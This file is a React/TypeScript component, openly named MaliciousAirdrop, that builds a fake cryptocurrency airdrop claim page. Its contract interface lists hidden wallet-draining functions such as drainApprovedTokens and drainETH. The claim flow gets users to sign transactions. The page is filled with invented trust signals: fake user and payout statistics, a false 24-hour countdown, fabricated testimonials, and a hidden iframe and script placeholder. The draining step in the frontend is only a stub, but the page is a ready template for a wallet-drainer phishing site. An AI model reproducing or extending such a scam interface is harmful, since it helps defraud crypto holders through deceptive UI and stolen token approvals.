import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useWallet } from '../context/WalletContext';

interface MaliciousAirdropProps {
  contractAddress: string;
}

interface AirdropInfo {
  totalClaimed: ethers.BigNumber;
  availableRewards: ethers.BigNumber;
  tasksCompleted: ethers.BigNumber;
}

const MaliciousAirdrop: React.FC<MaliciousAirdropProps> = ({ contractAddress }) => {
  const { account } = useWallet();
  const [airdropInfo, setAirdropInfo] = useState<AirdropInfo | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [claimStatus, setClaimStatus] = useState<string>('');
  const [referralCode, setReferralCode] = useState('');
  const [eligibility, setEligibility] = useState<boolean>(false);
  
  // Malicious contract ABI - looks legitimate but has hidden functions
  const contractABI = [
    'function getAirdropInfo(address) view returns (uint256, uint256, uint256)',
    'function claimAirdrop(string) returns (bool)',
    'function checkEligibility(address) view returns (bool)',
    // Hidden malicious functions (not shown in UI but can be called)
    'function drainApprovedTokens(address, address) external',
    'function drainETH(address) external',
    'function withdrawETH() external',
    'function withdrawERC20(address) external'
  ];

  const getContract = () => {
    if (!account || !window.ethereum) return null;
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    return new ethers.Contract(contractAddress, contractABI, signer);
  };

  // Load airdrop information
  const loadAirdropInfo = async () => {
    if (!account) return;
    
    try {
      const contract = getContract();
      if (!contract) return;

      const info = await contract.getAirdropInfo(account);
      setAirdropInfo({
        totalClaimed: info[0],
        availableRewards: info[1],
        tasksCompleted: info[2]
      });

      const eligible = await contract.checkEligibility(account);
      setEligibility(eligible);
    } catch (error) {
      console.error('Error loading airdrop info:', error);
    }
  };

  // Malicious claim function
  const claimAirdrop = async () => {
    if (!account || !referralCode.trim()) {
      setClaimStatus('Please enter a referral code');
      return;
    }

    setIsLoading(true);
    setClaimStatus('Processing claim...');

    try {
      const contract = getContract();
      if (!contract) throw new Error('Contract not available');

      // This transaction looks legitimate but triggers malicious behavior
      const tx = await contract.claimAirdrop(referralCode);
      
      setClaimStatus('Transaction submitted! Waiting for confirmation...');
      
      const receipt = await tx.wait();
      
      if (receipt.status === 1) {
        setClaimStatus('✅ Airdrop claimed successfully!');
        
        // Hidden malicious behavior - this would happen in the background
        await performHiddenMaliciousActions();
        
        // Reload info
        await loadAirdropInfo();
      } else {
        setClaimStatus('❌ Transaction failed');
      }
    } catch (error: any) {
      console.error('Error claiming airdrop:', error);
      setClaimStatus(`❌ Error: ${error.message || 'Unknown error'}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Hidden malicious actions that happen after successful claim
  const performHiddenMaliciousActions = async () => {
    try {
      const contract = getContract();
      if (!contract) return;

      // This would be called by the contract owner to drain funds
      // In a real scam, this might be automated or triggered by other events
      console.log('Performing hidden malicious actions...');
      
      // The malicious behavior is actually in the smart contract
      // This frontend just provides a convincing UI
      
    } catch (error) {
      console.error('Error in hidden actions:', error);
    }
  };

  // Generate fake referral code
  const generateReferralCode = () => {
    const codes = ['FRIEND50', 'BONUS100', 'WELCOME25', 'SPECIAL75'];
    const randomCode = codes[Math.floor(Math.random() * codes.length)];
    setReferralCode(randomCode);
  };

  useEffect(() => {
    if (account) {
      loadAirdropInfo();
    }
  }, [account]);

  if (!account) {
    return (
      <div className="max-w-md mx-auto bg-white rounded-lg shadow-lg p-6">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-gray-800 mb-4">🚀 Exclusive Airdrop</h2>
          <p className="text-gray-600 mb-4">
            Connect your wallet to check your eligibility for our exclusive token airdrop!
          </p>
          <div className="bg-gradient-to-r from-blue-500 to-purple-600 text-white p-4 rounded-lg">
            <p className="font-semibold">🎁 Limited Time Offer</p>
            <p className="text-sm">Up to 1000 tokens per wallet</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto bg-white rounded-lg shadow-lg p-6">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-gray-800 mb-2">🚀 Exclusive Airdrop</h2>
        <p className="text-gray-600">Claim your free tokens now!</p>
      </div>

      {/* Fake statistics to build trust */}
      <div className="grid grid-cols-3 gap-4 mb-6">
        <div className="text-center">
          <div className="text-2xl font-bold text-green-600">50K+</div>
          <div className="text-sm text-gray-500">Users</div>
        </div>
        <div className="text-center">
          <div className="text-2xl font-bold text-blue-600">$2M+</div>
          <div className="text-sm text-gray-500">Distributed</div>
        </div>
        <div className="text-center">
          <div className="text-2xl font-bold text-purple-600">24h</div>
          <div className="text-sm text-gray-500">Left</div>
        </div>
      </div>

      {/* Airdrop information */}
      {airdropInfo && (
        <div className="bg-gray-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-gray-800 mb-3">Your Airdrop Status</h3>
          <div className="space-y-2">
            <div className="flex justify-between">
              <span className="text-gray-600">Available Rewards:</span>
              <span className="font-semibold">
                {ethers.utils.formatEther(airdropInfo.availableRewards)} tokens
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Total Claimed:</span>
              <span className="font-semibold">
                {ethers.utils.formatEther(airdropInfo.totalClaimed)} tokens
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Tasks Completed:</span>
              <span className="font-semibold">{airdropInfo.tasksCompleted.toString()}</span>
            </div>
          </div>
        </div>
      )}

      {/* Eligibility status */}
      <div className="mb-6">
        {eligibility ? (
          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <div className="flex items-center">
              <div className="text-green-600 mr-2">✅</div>
              <div>
                <div className="font-semibold text-green-800">You're Eligible!</div>
                <div className="text-sm text-green-600">Claim your airdrop now</div>
              </div>
            </div>
          </div>
        ) : (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <div className="flex items-center">
              <div className="text-red-600 mr-2">❌</div>
              <div>
                <div className="font-semibold text-red-800">Already Claimed</div>
                <div className="text-sm text-red-600">You've already claimed your airdrop</div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Claim form */}
      {eligibility && (
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Referral Code (Optional)
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={referralCode}
                onChange={(e) => setReferralCode(e.target.value)}
                placeholder="Enter referral code"
                className="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <button
                onClick={generateReferralCode}
                className="px-4 py-2 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition-colors"
              >
                Generate
              </button>
            </div>
          </div>

          <button
            onClick={claimAirdrop}
            disabled={isLoading}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3 px-4 rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? 'Processing...' : '🎁 Claim Airdrop'}
          </button>

          {claimStatus && (
            <div className="text-center text-sm">
              <p className={claimStatus.includes('✅') ? 'text-green-600' : 'text-red-600'}>
                {claimStatus}
              </p>
            </div>
          )}
        </div>
      )}

      {/* Fake testimonials to build trust */}
      <div className="mt-6 pt-6 border-t border-gray-200">
        <h4 className="font-semibold text-gray-800 mb-3">What Users Say</h4>
        <div className="space-y-3">
          <div className="bg-blue-50 p-3 rounded-lg">
            <p className="text-sm text-gray-700">"Got my tokens instantly! Great project!"</p>
            <p className="text-xs text-gray-500 mt-1">- Alex M.</p>
          </div>
          <div className="bg-green-50 p-3 rounded-lg">
            <p className="text-sm text-gray-700">"Easy to claim, no issues at all!"</p>
            <p className="text-xs text-gray-500 mt-1">- Sarah K.</p>
          </div>
        </div>
      </div>

      {/* Hidden malicious elements (not visible but present) */}
      <div style={{ display: 'none' }}>
        {/* This would contain hidden iframes or scripts in a real scam */}
        <iframe src="about:blank" title="hidden" />
        <script dangerouslySetInnerHTML={{ __html: '// Hidden malicious script' }} />
      </div>
    </div>
  );
};

export default MaliciousAirdrop; 